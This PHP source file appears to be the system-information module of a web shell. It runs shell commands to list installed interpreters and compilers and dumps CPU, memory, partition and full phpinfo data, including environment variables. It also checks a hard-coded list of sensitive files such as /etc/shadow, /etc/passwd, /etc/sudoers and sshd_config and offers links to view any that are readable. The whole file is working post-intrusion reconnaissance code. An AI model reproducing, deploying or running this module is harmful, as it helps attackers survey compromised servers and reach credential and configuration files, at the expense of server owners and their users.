<?php
$GLOBALS['module']['info']['id'] = "info";
$GLOBALS['module']['info']['title'] = "Info";
$GLOBALS['module']['info']['js_ontabselected'] = "";
$GLOBALS['module']['info']['content'] = "<div class='border infoResult'></div>";

if(!function_exists('info_getinfo')){
	function info_getinfo(){
		$res = "";
		// server misc info
		$res .= "<p class='boxtitle' onclick=\"info_toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>";
		$res .= "<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>";

		if(is_win()){
			foreach (range("A", "Z") as $letter){
				if(is_readable($letter.":\\")){
					$drive = $letter.":";
					$res .= "<tr><td>drive ".$drive."</td><td>".format_bit(@disk_free_space($drive))." free of ".format_bit(@disk_total_space($drive))."</td></tr>";
				}
			}
		}
		else $res .= "<tr><td>root partition</td><td>".format_bit(@disk_free_space("/"))." free of ".format_bit(@disk_total_space("/"))."</td></tr>";

		$res .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
		$access = array("python"=>"python -V",
						"perl"=>"perl -e \"print \$]\"",
						"python"=>"python -V",
						"ruby"=>"ruby -v",
						"node"=>"node -v",
						"nodejs"=>"nodejs -v",
						"gcc"=>"gcc -dumpversion",
						"java"=>"java -version",
						"javac"=>"javac -version"
						);

		foreach($access as $k=>$v){
			$version = execute($v);
			$version = explode("\n", $version);
			if($version[0]) $version = $version[0];
			else $version = "?";

			$res .= "<tr><td>".$k."</td><td>".$version."</td></tr>";
		}

		if(!is_win()){
			$interesting = array(
			"/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
			"/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
			"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
			"/etc/ssh/sshd_config",
			"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
			"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
			"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
			foreach($interesting as $f){
				if(@is_file($f) && @is_readable($f)) $res .= "<tr><td>".$f."</td><td><a data-path='".html_safe($f)."' onclick='view_entry(this);'>".$f." is readable</a></td></tr>";
			}
		}
		$res .= "</table></div>";

		if(!is_win()){
			// cpu info
			if($i_buff=trim(read_file("/proc/cpuinfo"))){
				$res .= "<p class='boxtitle' onclick=\"info_toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>";
				$res .= "<div class='info' id='info_cpu' style='margin-bottom:8px;display:none;'>";
				$i_buffs = explode("\n\n", $i_buff);
				foreach($i_buffs as $i_buffss){
					$i_buffss = trim($i_buffss);
					if($i_buffss!=""){
						$i_buffsss = explode("\n", $i_buffss);
						$res .= "<table class='dataView'>";
						foreach($i_buffsss as $i){
							$i = trim($i);
							if($i!=""){
								$ii = explode(":",$i);
								if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
							}
						}
						$res .= "</table>";
					}
				}
				$res .= "</div>";
			}

			// mem info
			if($i_buff=trim(read_file("/proc/meminfo"))){
				$res .= "<p class='boxtitle' onclick=\"info_toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>";
				$i_buffs = explode("\n", $i_buff);
				$res .= "<div class='info' id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>";
				foreach($i_buffs as $i){
					$i = trim($i);
					if($i!=""){
						$ii = explode(":",$i);
						if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
					}
					else $res .= "</table><table class='dataView'>";
				}
				$res .= "</table></div>";
			}

			// partition
			if($i_buff=trim(read_file("/proc/partitions"))){
				$i_buff = preg_replace("/\ +/", " ", $i_buff);
				$res .= "<p class='boxtitle' onclick=\"info_toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>";
				$res .= "<div class='info' id='info_part' style='margin-bottom:8px;display:none;'>";
				$i_buffs = explode("\n\n", $i_buff);
				$res .= "<table class='dataView'><tr>";
				$i_head = explode(" ", $i_buffs[0]);
				foreach($i_head as $h) $res .= "<th>".$h."</th>";
				$res .= "</tr>";
				$i_buffss = explode("\n", $i_buffs[1]);
				foreach($i_buffss as $i_b){
					$i_row = explode(" ", trim($i_b));
					$res .= "<tr>";
					foreach($i_row as $r) $res .= "<td style='text-align:center;'>".$r."</td>";
					$res .= "</tr>";
				}
				$res .= "</table>";
				$res .= "</div>";
			}
		}
		$phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES);
		foreach($phpinfo as $p=>$i){
			$res .= "<p class='boxtitle' onclick=\"info_toggle('".$i."');\" style='margin-bottom:8px;'>".$p."</p>";
			ob_start();
			eval("phpinfo(".$i.");");
			$b = ob_get_contents();
			ob_end_clean();
			if(preg_match("/<body>(.*?)<\/body>/is", $b, $r)){
				$body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]);
				$body = str_replace("<table", "<table class='boxtbl' ", $body);
				$body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body);
				$body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", "", $body);
				$body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", "", $body);

				$res .= "<div class='info' id='".$i."' style='margin-bottom:8px;display:none;'>".$body."</div>";
			}
		}

		$res .= "<span class='button colSpan' onclick=\"info_refresh();\" style='margin-bottom:8px;'>refresh</span><div style='clear:both;'></div>";
		return $res;
	}
}

if(isset($p['infoRefresh'])){
	output(info_getinfo());
}

?>